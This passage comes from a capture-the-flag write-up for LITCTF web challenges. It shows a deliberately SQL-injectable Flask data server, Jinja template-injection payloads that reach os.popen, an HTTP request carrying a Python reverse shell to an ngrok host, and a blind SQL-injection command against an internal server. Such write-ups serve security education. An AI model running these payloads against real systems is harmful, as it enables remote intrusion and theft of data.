<span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">cur <span class="token operator">=</span> con<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''DROP TABLE IF EXISTS users'''</span><span class="token punctuation">)</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''CREATE TABLE users (username text, password text)'''</span><span class="token punctuation">)</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    <span class="token triple-quoted-string string">'''INSERT INTO users (username,password) VALUES ("flag","'''</span> <span class="token operator">+</span> flag <span class="token operator">+</span> <span class="token triple-quoted-string string">'''") '''</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token punctuation">)</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/runquery'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token keyword">def</span> <span class="token function">runquery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  request_data <span class="token operator">=</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  username <span class="token operator">=</span> request_data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  password <span class="token operator">=</span> request_data<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  <span class="token keyword">print</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  </div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"SELECT * FROM users WHERE username='"</span> <span class="token operator">+</span> username <span class="token operator">+</span> <span class="token string">"' AND password='"</span> <span class="token operator">+</span> password <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  rows <span class="token operator">=</span> cur<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>rows<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    <span class="token keyword">return</span> <span class="token string">"True"</span><span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  <span class="token keyword">return</span> <span class="token string">"False"</span><span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      In this server, they&#39;ll check our input of username and password from the main server, the query is sqli-able
      so we just need to inject it and leak the flag easily. But it wasn&#39;t that easy, the data server only response
      when the main server request to it, so it has to be internal server. After analysing, we&#39;ll know the workflow
      of the website.
    </p>
    <ul>
      <li>
        First the main server will check if our input username and password has any dot in it, if don&#39;t, they will
        send a request to data server with our input username and password (and alphanumericalOnly) as json.
      </li>
      <li>
        The data server will receive the request and treat our input by adding it to a query which check the username
        and password and then return True if it right or False if not (boolean based sqli)
      </li>
      <li>
        Come back to the main server, if the data server return True, it will render <code class="inline-code-block">
          OMG you are like so good at guessing our flag I am lowkey jealoussss.
        </code>
        which means we have input the right flag, but it&#39;s impossible to has this show up because we can&#39;t input
        <code class="inline-code-block">&lcub</code>
        since the request of data is alphanumerical only. So it&#39;ll always return
        <code class="inline-code-block">
          ok thank you for your info i have now sold your password &lpar&quot; + password + &quot;&rpar for 2 donuts
          :&rpar
        </code>
      </li>
    </ul>
    <p>
      The thing we want is the True and False return from the data server, not the render of main server, which means we
      have to make the request from the main server, so it will be able to connect with internal server. To do that, we
      have to RCE the server first.
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-python">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token punctuation">{</span><span class="token punctuation">{</span>lipsum<span class="token punctuation">[</span><span class="token string">'__globals__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span></div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180784191-46f382c4-cb43-4e47-be93-99625bd6f9dd.png"
        alt="image" />
    </p>
    <p>
      We want to know the IP of the data server to make request to it, so we have to read the <code
        class="inline-code-block">
        main.py
      </code>
      . Since it has the dot in the name file so I decided to get reverse shell to intuitively do the challenge.
    </p>
    <p>
      I&#39;ll use the inject-directly-to-config-and-popen-it method (you can find out how in my ImaginaryCTF write up),
      i won&#39;t explain it here.
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code>{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">POST /?t=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%220.tcp.ap.ngrok.io%22%2C12720%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27 HTTP/1.1</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">Host: litctf.live:31781</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">Content-Length: 145</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">Cache-Control: max-age=0</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">Upgrade-Insecure-Requests: 1</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">Origin: http://litctf.live:31781</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">Content-Type: application/x-www-form-urlencoded</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">Referer: http://litctf.live:31781/</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">Accept-Encoding: gzip, deflate</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">Accept-Language: en-US,en;q=0.9</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">Connection: close</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">username=assdf&amp;password=%7B%7B%28config%7Cattr%28dict%28up%3Dup%2Cdate%3Ddate%29%7Cjoin%29%29%28t%3Drequest%5B%27args%27%5D%5B%27t%27%5D%29%7D%7D</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180790318-8867c96d-eaa5-4db3-8f22-32ccfcb4d1c1.png"
        alt="image" />
    </p>
    <p>
      Read <code class="inline-code-block">&lcub&lcubconfig&rcub&rcub</code>
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180790436-38012c35-e814-435d-b3a3-14946f3a2710.png"
        alt="image" />
    </p>
    <p>Popen it</p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-python">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token punctuation">{</span><span class="token punctuation">{</span>lipsum<span class="token punctuation">[</span><span class="token string">'__globals__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>config<span class="token punctuation">[</span><span class="token string">'t'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span></div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180790561-1e502da6-0c0d-4469-b1bf-759927a0fec6.png"
        alt="image" />
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180790589-b0937a51-941a-4be2-b525-1ec708ac0684.png"
        alt="image" />
    </p>
    <p>Let&#39;s find out the IP</p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180790704-9a3ded75-609b-4aae-838f-149dd2d83ffb.png"
        alt="image" />
    </p>
    <p>
      So we got all we need, noticed that <code class="inline-code-block">requests</code>
      module was installed so we just use it to request to
      <code class="inline-code-block">http://172.24.0.8:8080/runquery</code>
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180791111-0382a5c9-61a5-4108-b43a-75b4cec28c19.png"
        alt="image" />
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-terminal">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">python3 -c "import requests; r=requests.post('http://172.24.0.8:8080/runquery', json={'username':'\'/**/or/**/(select/**/hex(substr(password,1,1))/**/from/**/users/**/where/**/username=\'flag\')/**/=/**/hex(\'L\')/**/--','password':'no'}); print(r.text)"</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180793045-76e205d3-a38d-4ca8-b4f4-7de0fc51c757.png"
        alt="image" />
    </p>
    <p>Now just write a script for all that :D</p>
    <h1 id="eyangch-fan-art-maker-intended-solution">
      <a href="#eyangch-fan-art-maker-intended-solution">EYANGCH Fan Art Maker (intended solution)</a>
    </h1>
    <p>
      I&#39;m very curious about the actual solution so let&#39;s just find out what&#39;s the intended solution of this
      chall. Let&#39;s read the code again (I&#39;ve missed the <code class="inline-code-block">views</code>
       folder for the hold event :D)
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180924860-ad5d0c06-4def-4d6d-81eb-179e18eec876.png"
        alt="image" />
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-html">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">HTML</span><span class="token punctuation">></span></span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>EYANGCH Fan Art Maker &lt;3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">            <span class="token selector">.bg</span><span class="token punctuation">{</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">                <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">"https://cdn.discordapp.com/avatars/622575440305061910/e0fa5d8c91cc24f83af648736072d330.webp?size=256"</span><span class="token punctuation">)</span></span><span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">                <span class="token property">background-repeat</span><span class="token punctuation">:</span> repeat<span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">                <span class="token property">opacity</span><span class="token punctuation">:</span> 0.3<span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">                <span class="token property">top</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">                <span class="token property">left</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">                <span class="token property">right</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">                <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">                <span class="token property">z-index</span><span class="token punctuation">:</span> -1<span class="token punctuation">;</span> </div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">                <span class="token property">height</span><span class="token punctuation">:</span> 300%<span class="token punctuation">;</span> </div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">            <span class="token punctuation">}</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">            <span class="token selector">pre code</span> <span class="token punctuation">{</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">                <span class="token property">background-color</span><span class="token punctuation">:</span> #eee<span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">                <span class="token property">border</span><span class="token punctuation">:</span> 1px solid #999<span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">                <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">                <span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">                <span class="token property">font-size</span><span class="token punctuation">:</span> 18px<span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">            <span class="token punctuation">}</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">            <span class="token selector">textarea</span> <span class="token punctuation">{</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">                <span class="token property">width</span><span class="token punctuation">:</span> 50%<span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">                <span class="token property">height</span><span class="token punctuation">:</span> 400px<span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">                <span class="token property">font-size</span><span class="token punctuation">:</span> 18px<span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">            <span class="token punctuation">}</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span> </div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>EYANG OTZ OTZ OTZ!!! <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data:image/png;base64, &lt;%= img %><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    &lt;% if(rick) { %></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"How dare you make an error on the EYANG FAN ART!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">"https://www.youtube.com/watch?v=dQw4w9WgXcQ&amp;ab_channel=RickAstley"</span><span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    &lt;% } %></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      If our input code leads an error after generate the fanart, it&#39;ll be alert an error and then redirect to rick
      roll video. Let&#39;s look at the class component
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-javascript">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">class component {</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    constructor(name,parent) {</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        this.name = name;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        this.parent = parent;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        this.dx = 0;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        this.dy = 0;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        this.x = 0;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        this.y = 0;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        // &lt;text&gt; &lt;shape&gt; &lt;line&gt; are literals</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        this.literals = [];</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        if(this == parent) throw "Error: parent cannot be itself!";</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    }</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    toString() { return this.name; }</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">}</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      It checks if the component equals to the parent, it will throw an error which will alert. So what we gonna do here
      is we&#39;ll define a new component which has its parent equals to parent and we&#39;ll check every single word of
      flag component, so if it&#39;s right, it&#39;ll throw the error because of its <code class="inline-code-block">
        component == parent
      </code>
      just like the code. And we can also see the
      <code class="inline-code-block">toString&lpar&rpar</code>
      function which means it will return to us a string, so we&#39;ll use
      <code class="inline-code-block">innerText</code>
       to have it show up.
    </p>
    <p>final payload (by the author)</p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-javascript">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;component name="clown"&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;component name="parent"&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;component name="flag"&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;component name="literals"&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;component name="0"&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;component name="innerText"&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;component name="0"&gt; &lt;!-- this is the ith character --&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;component name="L"&gt; &lt;!-- this is the character that we want to check --&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;/component&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;/component&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;/component&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;/component&gt;</div></div><div class="code-line"><div class="code-linenotation"><span 